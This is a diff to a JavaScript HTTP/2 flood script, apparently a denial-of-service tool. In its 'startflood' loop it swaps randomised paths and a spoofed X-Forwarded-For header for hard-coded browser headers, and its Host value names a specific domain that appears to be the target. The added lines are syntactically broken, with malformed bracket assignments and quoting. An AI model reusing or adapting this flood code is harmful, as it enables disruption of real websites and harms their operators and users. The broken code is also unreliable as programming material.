@@ -549,9 +549,16 @@ function startflood(){
                                 socket: socket
                             }, function () {
                                 for (let i = 0; i< rate; i++){
-                                    headerbuilders[":path"] = `${url.parse(target).path.replace("%RAND%",ra())}?${randomparam}=${randstr.generate({length:12,charset:"ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}`
-                                    headerbuilders["X-Forwarded-For"] = spoof();
-                                    headerbuilders["Cookie"].replace("%RAND%",ra());
+                                    headerbuilders["Accept:" = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
+                                    headerbuilders["Accept-Encoding:" = "gzip, deflate";
+                                    headerbuilders["Accept-Language:" = "en-US,en;q=0.9";
+                                    headerbuilders["Cache-Control:" = "max-age=0";
+                                    headerbuilders["Connection:" = "keep-alive";
+                                    headerbuilders["Host:" = "batik77.satkomindo.com";
+                                    headerbuilders["If-Modified-Since:" = "Tue, 21 Nov 2023 04:45:49 GMT";
+                                    headerbuilders["If-None-Match: "W/"655c35fd-5993"";
+                                    headerbuilders["Upgrade-Insecure-Requests:" = "1";
+                                    headerbuilders["User-Agent:" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";
                                     const req = client.request(headerbuilders);
                                     req.end();
                                     req.on("response", () => {
